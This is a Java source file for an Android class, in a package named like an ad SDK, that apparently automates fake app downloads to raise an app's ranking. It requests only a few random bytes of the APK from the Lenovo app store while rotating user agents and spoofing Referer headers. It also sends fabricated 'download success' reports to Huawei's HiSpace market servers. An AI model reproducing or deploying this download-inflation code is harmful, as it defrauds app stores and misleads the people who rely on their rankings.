package com.umeng.ad.app;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.params.HttpClientParams;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.apache.http.protocol.HTTP;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.text.TextUtils;
import android.util.JsonReader;

import com.umeng.ad.app.u.TimeExtra;
import com.umeng.ad.app.utils.SAXReader;

class MarketLenovo extends Market {

	private String APP_ID = "";

	public MarketLenovo() {
	}

	public MarketLenovo(String packageName) {
		MARKET_NAME = MARKET_LENOVO;
		setPackageName(packageName);
	}

	@Override
	protected boolean prepareToRank(Context context) throws Exception {

		DeviceInfo deviceInfo = new DeviceInfo(context);
		deviceInfo.setUserAgent(u.getInstance().getAgent(
				(int) (System.currentTimeMillis() % 14)));
		String resName = getAppKeyword();

		/**
		 * 假如，分类参数为空，或者有10%的机会搜索，那么就进行搜索下载
		 */
		int random = (int) (Math.random() * 100);
		MLog.v(" app_id:" + APP_ID + " random:" + random);
		if (TextUtils.isEmpty(APP_ID) || (random >= 0 && random < 2)) {
			
			if (!this.actionSearch(context)) {
				return false;
			};
		}
		/**
		 * Step1.DownloadPre.
		 */
		StringBuffer preURL = new StringBuffer(
				"http://www.lenovomm.com/appstore/downloadToComputer.do?");
		preURL.append("lIds=" + APP_ID + "&");
		preURL.append("timespan=" + System.currentTimeMillis());

		StringBuffer referBuf = new StringBuffer(
				" http://www.lenovomm.com/appstore/html/pcAppDetail.html?");
		referBuf.append(APP_ID + "");

		// downloadPre
		String downloadURL = this.downloadPre(preURL.toString(),
				referBuf.toString(), deviceInfo.getUserAgent());
		MLog.d("downloadURL:" + downloadURL);

		/**
		 * Step2.Download APK
		 */
		return this.download(referBuf.toString(), downloadURL,
				deviceInfo.getUserAgent());
	}

	private boolean  actionSearch(Context context) {
		try {
			String keyWord = getAppKeyword();
			MLog.v("actionSearch");
			String url = "http://app.lenovo.com/search/index.html?q="
					+ URLEncoder.encode(keyWord, "utf-8");
			MLog.i("actionSearch:" + url);
			// Request
			HttpGet httpGet = new HttpGet(url);
			httpGet.addHeader("Accept-Encoding", "gzip");

			// Client params
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			u.setParamsForHttpConnection(params);
			HttpClientParams.setRedirecting(params, false);
			HttpProtocolParams.setUserAgent(params, u.randomAgent());
			client.setParams(params);

			// Response
			HttpResponse response = client.execute(httpGet);
			int statusCode = response.getStatusLine().getStatusCode();
			MLog.i("status:" + statusCode);

			String content = u
					.readContentFromHttpResponse(response, HTTP.UTF_8);
			int index1 = content.indexOf("<ul class=\"appList\">");
			int index2 = content.indexOf("alt=\"") - 1;
			MLog.d("index1:"+index1+" index2:"+index2);
			content = content.substring(index1, index2);
			APP_ID = content.substring(content.indexOf("app/")+4, content.indexOf("html")-1);
			
			MLog.i("content:" + content);
			MLog.i("app_id:"+APP_ID);
			if (Long.valueOf(APP_ID)>0) {
				JSONArray arrayKey = new JSONArray();
				arrayKey.put("appId");
				JSONArray arrayValue = new JSONArray();
				arrayValue.put(APP_ID);
				super.updateMarketAppParams(context, arrayKey, arrayValue);
				return true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	private String downloadPre(String url, String refer, String agent) {
		String downloadURL = null;
		try {
			HttpGet httpGet = new HttpGet(url);
			httpGet.addHeader("Referer", refer);

			/**
			 * Logger.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A '" + agent + "' ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, agent);
			client.setParams(params);
			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("status_code:" + code);

			String body = u.readContentFromHttpResponse(response, HTTP.UTF_8);
			MLog.i("downloadPre body content:" + body);
			try {
				JSONObject jsonObject = new JSONObject(body);
				downloadURL = jsonObject.getJSONObject("body").getString(
						"downloadUrl");
				MLog.d("Got download URL:" + downloadURL);
			} catch (Exception e) {
				e.printStackTrace();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return downloadURL;
	}

	/**
	 * Download apk
	 * 
	 * @param refer
	 * @param url
	 * @param agent
	 * @return
	 */
	private boolean download(String refer, String url, String agent) {
		try {
			/**
			 * data
			 */
			HttpGet httpGet = new HttpGet(url);
			int range = ((int) (Math.random() * 300));
			MLog.i("range:" + range + "-" + (range + 2));
			httpGet.addHeader("Range", "bytes=" + range + "-" + (range + 2));
			httpGet.addHeader("Referer", refer);

			/**
			 * Logger.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A '" + agent + "' ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, agent);
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("download=>status_code:" + code);
			if (code == HttpStatus.SC_PARTIAL_CONTENT) {
				return true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return false;
	}

	private boolean searchAPP(String url, String httpparams,
			HashMap<String, String> httpParamHash) {
		try {
			url = url + "?" + httpparams;
			HttpGet httpPost = new HttpGet(url);

			/**
			 * Logger.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpPost.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'Android/1.0' ");
			curlString.append(url);
			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, "Android/1.0");
			client.setParams(params);
			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpPost);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("searchAPP=>status_code:" + code);

			InputStream inputstream = response.getEntity().getContent();
			InputStreamReader inputstreamreader = new InputStreamReader(
					inputstream, "utf-8");
			BufferedReader bufferedreader = new BufferedReader(
					inputstreamreader);

			StringBuffer lines = new StringBuffer();
			String line = "";
			while ((line = bufferedreader.readLine()) != null) {
				// Logger.i(this, line);
				lines.append(line);
			}
			String[] downloadPackages = new String[] { getPackageName() };
			List<JSONObject> downloadObjects = new ArrayList<JSONObject>();
			try {
				JSONObject jsonObject = new JSONObject(lines.toString());
				JSONArray jsonArray = jsonObject.getJSONArray("list");
				for (int i = 0; i < jsonArray.length(); i++) {
					JSONObject jObject = jsonArray.getJSONObject(i);
					// app_id
					String app_package = jObject.getString("package");
					for (String the_package : downloadPackages) {
						if (app_package.endsWith(the_package)) {
							downloadObjects.add(jObject);
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

			/**
			 * Download app
			 */

			for (JSONObject object : downloadObjects) {
				return this.download(object, httpParamHash);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	/**
	 * 
	 */
	private boolean download(JSONObject jsoobject,
			HashMap<String, String> hashparams) {
		try {
			/**
			 * data
			 */
			MLog.i("download...." + jsoobject.getString("name"));
			String url = jsoobject.getString("downurl");
			url += "cno=" + hashparams.get(("cno")) + "&";
			url += "net=" + hashparams.get(("net"));

			String range = (Long.valueOf(jsoobject.getString("size")) - 2)
					+ "-" + Long.valueOf(jsoobject.getString("size"));

			HttpGet httpGet = new HttpGet(url);
			httpGet.addHeader("Range", "bytes=" + range);
			/**
			 * Logger.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'HiSpace' ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, "HiSpace");
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("Download=>status_code:" + code);

			/**
			 * When download ok, post request to server
			 */
			this.getAppAction(jsoobject, hashparams);
			return this.getGameArea(jsoobject, hashparams);

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	/**
	 * 
	 */
	private void getAppAction(JSONObject jsoobject,
			HashMap<String, String> hashparams) {
		try {
			/**
			 * data
			 */
			String url = "http://hispaceclt.hicloud.com:8080/hwmarket/client/appAction-shelves.do?";
			url += "sign=" + hashparams.get(("sign")) + "&";
			url += "type=down_sucess&";
			url += "appId=" + jsoobject.getString("id") + "&";
			url += "version=" + jsoobject.get("versionCode") + "&";
			url += "reason=0&";
			url += "cno=" + hashparams.get(("cno")) + "&";
			url += "net=" + hashparams.get(("net"));

			HttpGet httpGet = new HttpGet(url);

			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'Android/1.0' ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, "Android/1.0");
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("getAppAction=>status_code:" + code);
			InputStream inputstream = response.getEntity().getContent();
			InputStreamReader inputstreamreader = new InputStreamReader(
					inputstream);
			BufferedReader bufferedreader = new BufferedReader(
					inputstreamreader);

			StringBuffer lines = new StringBuffer();
			String line = "";
			while ((line = bufferedreader.readLine()) != null) {
				MLog.i(line);
				lines.append(line);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 
	 */
	private boolean getGameArea(JSONObject jsoobject,
			HashMap<String, String> hashparams) {
		try {
			String url = "http://hispaceclt.hicloud.com:8080/hwmarket/client/gameAreaDownload.do?";
			url += "sign=" + hashparams.get(("sign")) + "&";
			url += "areaName=Hi_Space&";
			url += "appName="
					+ URLEncoder.encode(jsoobject.getString("name"), "UTF-8")
					+ "&";
			url += "downLoadTime="
					+ new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss")
							.format(new Date()) + "&";
			url += "cno=" + hashparams.get(("cno")) + "&";
			url += "net=" + hashparams.get(("net"));

			HttpGet httpGet = new HttpGet(url);

			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'Android/1.0' ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, "Android/1.0");
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("getGameArea=>status_code:" + code);
			if (code == HttpStatus.SC_OK
					&& PACKAGE_NAME.equals(jsoobject.getString("package"))) {
				return true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return false;
	}

	public String getAPP_ID() {
		return APP_ID;
	}

	public void setAPP_ID(String aPP_ID) {
		APP_ID = aPP_ID;
	}

	@Override
	protected void initAllParams() {
		try {
			setAPP_ID(params.get("a_appId"));
			MLog.v("Lenovo:" + APP_ID);
		} catch (Exception e) {
		}
	}

}
